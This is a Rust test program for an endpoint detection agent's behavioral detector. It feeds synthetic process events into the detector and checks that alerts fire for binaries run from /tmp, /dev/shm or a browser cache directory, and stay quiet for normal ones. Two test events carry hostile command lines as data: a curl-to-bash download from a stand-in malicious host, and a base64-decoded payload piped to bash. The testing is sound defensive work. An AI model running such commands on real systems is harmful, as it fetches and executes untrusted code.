use std::collections::HashMap;
use tokio::sync::mpsc;
use edr_agent::detectors::behavioral::BehavioralDetector;
use edr_agent::config::BehavioralDetectorConfig;
use edr_agent::events::{Event, EventData, ProcessEventData, EventType};
use edr_agent::detectors::Detector;
use chrono::Utc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔍 Testing Linux Detection Capabilities");
    
    // Create detector configuration with all required fields
    let config = BehavioralDetectorConfig {
        enabled: true,
        scan_interval_ms: 1000,
        alert_threshold: 0.4,
        prevention_threshold: 0.8,
        track_api_calls: true,
        monitor_memory_operations: true,
        monitor_thread_operations: true,
        cross_platform_detection: true,
        system_process_contexts: HashMap::new(),
        alert_frequency_limits: HashMap::new(),
        path_context_rules: HashMap::new(),
        network_behavior_rules: HashMap::new(),
        time_based_risk_adjustment: Default::default(),
        process_whitelist: Default::default(),
    };
    
    let (alert_sender, mut alert_receiver) = mpsc::channel(100);
    
    // Create behavioral detector
    let detector = BehavioralDetector::new(
        config,
        alert_sender,
        "test-agent".to_string(),
        "test-host".to_string(),
    ).await?;
    
    detector.start().await?;
    
    println!("✅ Behavioral detector started");
    
    // Test 1: systemd in expected location (should NOT trigger alert)
    println!("\n📋 Test 1: systemd process in expected location");
    let systemd_expected_event = create_test_process_event(
        1,
        "systemd".to_string(),
        "/lib/systemd/systemd".to_string(),
        Some(0),
    )?;

    detector.process_event(&systemd_expected_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Should NOT generate alert for legitimate system process
    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(50),
        alert_receiver.recv()
    ).await;

    if alert.is_ok() && alert.unwrap().is_some() {
        panic!("❌ Test 1 FAILED: systemd in expected location should NOT trigger alert");
    }
    println!("✅ Test 1 PASSED: No alert for legitimate systemd process");
    
    // Test 2: systemd in unexpected location (should trigger alert)
    println!("📋 Test 2: systemd process in unexpected location");
    let systemd_suspicious_event = create_test_process_event(
        2,
        "systemd".to_string(),
        "/tmp/systemd".to_string(),
        Some(1),
    )?;

    detector.process_event(&systemd_suspicious_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Should generate alert for suspicious path
    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 2 FAILED: systemd in /tmp should trigger alert");
    println!("✅ Test 2 PASSED: Alert generated for systemd in suspicious location");
    
    // Test 3: Shell execution from suspicious location
    println!("📋 Test 3: Shell process in suspicious location");
    let shell_suspicious_event = create_test_process_event(
        3,
        "bash".to_string(),
        "/tmp/bash".to_string(),
        Some(1000),
    )?;

    detector.process_event(&shell_suspicious_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 3 FAILED: bash in /tmp should trigger alert");
    println!("✅ Test 3 PASSED: Alert generated for shell in suspicious location");
    
    // Test 4: Shell with suspicious parent process simulation
    println!("📋 Test 4: Shell process execution from /dev/shm");
    let shell_devshm_event = create_test_process_event(
        4,
        "sh".to_string(),
        "/dev/shm/malicious_script".to_string(),
        Some(2000),
    )?;

    detector.process_event(&shell_devshm_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 4 FAILED: shell in /dev/shm should trigger alert");
    println!("✅ Test 4 PASSED: Alert generated for shell in /dev/shm");

    // Test 5: Process execution from browser cache
    println!("📋 Test 5: Process execution from browser cache directory");
    let browser_cache_event = create_test_process_event(
        5,
        "suspicious_binary".to_string(),
        "/home/user/.cache/mozilla/firefox/evil_binary".to_string(),
        Some(3000),
    )?;

    detector.process_event(&browser_cache_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Note: Browser cache detection is Linux-specific and requires #[cfg(target_os = "linux")]
    // This test may not trigger on other platforms
    #[cfg(target_os = "linux")]
    {
        let alert = tokio::time::timeout(
            std::time::Duration::from_millis(100),
            alert_receiver.recv()
        ).await;

        assert!(alert.is_ok() && alert.unwrap().is_some(),
            "❌ Test 5 FAILED: browser cache execution should trigger alert on Linux");
        println!("✅ Test 5 PASSED: Alert generated for browser cache execution");
    }

    #[cfg(not(target_os = "linux"))]
    {
        // Drain any potential alert on non-Linux platforms
        let _ = tokio::time::timeout(
            std::time::Duration::from_millis(50),
            alert_receiver.recv()
        ).await;
        println!("ℹ️  Test 5 SKIPPED: Browser cache detection is Linux-specific");
    }

    // Test 6: Normal process in expected location (should NOT trigger alert)
    println!("📋 Test 6: Normal process in expected location");
    let normal_event = create_test_process_event(
        6,
        "ls".to_string(),
        "/bin/ls".to_string(),
        Some(1000),
    )?;

    detector.process_event(&normal_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(50),
        alert_receiver.recv()
    ).await;

    if alert.is_ok() && alert.unwrap().is_some() {
        panic!("❌ Test 6 FAILED: Normal /bin/ls should NOT trigger alert");
    }
    println!("✅ Test 6 PASSED: No alert for legitimate process");

    // Test 7: Process with suspicious command line
    println!("📋 Test 7: Process with suspicious command line");
    let suspicious_cmd_event = create_test_process_event_with_cmdline(
        7,
        "bash".to_string(),
        "/bin/bash".to_string(),
        Some(1000),
        Some("bash -c 'curl http://malicious.com/payload | bash'".to_string()),
    )?;

    detector.process_event(&suspicious_cmd_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 7 FAILED: suspicious command line should trigger alert");
    println!("✅ Test 7 PASSED: Alert generated for suspicious command line");

    // Test 8: Process from suspicious location (/tmp)
    println!("📋 Test 8: Process from /tmp directory");
    let tmp_process_event = create_test_process_event(
        8,
        "suspicious_injector".to_string(),
        "/tmp/injector".to_string(),
        Some(1),
    )?;

    detector.process_event(&tmp_process_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 8 FAILED: process from /tmp should trigger alert");
    println!("✅ Test 8 PASSED: Alert generated for process in /tmp");

    // Test 9: Process from suspicious location (/tmp)
    println!("📋 Test 9: Process from /tmp with suspicious name");
    let tmp_fake_updater_event = create_test_process_event(
        9,
        "ld_preload_attack".to_string(),
        "/tmp/fake_updater".to_string(),
        Some(1),
    )?;

    detector.process_event(&tmp_fake_updater_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 9 FAILED: fake updater from /tmp should trigger alert");
    println!("✅ Test 9 PASSED: Alert generated for suspicious process in /tmp");

    // Test 10: Command line with injection indicators
    println!("📋 Test 10: Shell with injection patterns");
    let injection_cmd_event = create_test_process_event_with_cmdline(
        10,
        "bash".to_string(),
        "/bin/bash".to_string(),
        Some(1000),
        Some("echo 'payload' | base64 -d | bash; ptrace -p 1234".to_string()),
    )?;

    detector.process_event(&injection_cmd_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 10 FAILED: command with injection patterns should trigger alert");
    println!("✅ Test 10 PASSED: Alert generated for injection command pattern");
    
    println!("\n✅ All Linux detection tests PASSED");
    println!("🔍 Validated capabilities:");
    println!("   ✓ System process context recognition (systemd in expected vs suspicious locations)");
    println!("   ✓ Suspicious path detection (/tmp, /dev/shm, browser cache)");
    println!("   ✓ Shell execution monitoring from untrusted locations");
    println!("   ✓ Command line pattern analysis (curl piped to bash, base64 decode, etc.)");
    println!("   ✓ Negative validation (legitimate processes don't trigger false positives)");
    println!("   ✓ Risk scoring and alert generation");

    Ok(())
}

fn create_test_process_event(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line: None,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}

fn create_test_process_event_with_cmdline(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
    command_line: Option<String>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}

